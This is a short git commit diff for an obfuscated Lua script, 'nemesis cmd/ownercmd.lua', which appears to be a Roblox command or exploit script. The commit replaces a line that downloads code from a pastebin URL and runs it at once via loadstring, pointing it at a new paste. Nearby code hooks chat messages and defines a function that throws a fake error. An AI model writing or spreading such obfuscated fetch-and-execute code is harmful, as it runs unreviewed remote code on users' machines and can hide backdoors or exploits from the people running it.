7825fac43749f887e037ba343c452526adb86b5d
ykknzo-hub <kenzielimonn@gmail.com>
2026-08-19 03:43:23 +0100

    Update ownercmd.lua

--- nemesis cmd/ownercmd.lua
+++ nemesis cmd/ownercmd.lua
@@ -53,7 +53,7 @@ _callcloneref10.TextChannels.RBXGeneral.MessageReceived:Connect(function(_66, _6
     string.sub(_Text73, 1, 1)
 end)
 _callcloneref4.Heartbeat:Connect(function() end)
-loadstring(game:HttpGet('https://pastebin.com/raw/Vfw0g4qy'))()
+loadstring(game:HttpGet('https://pastebin.com/raw/FadgFS5p'))()
 
 genv[_gameJobId30] = function(_85)
     error('line 1: attempt to call a table value')
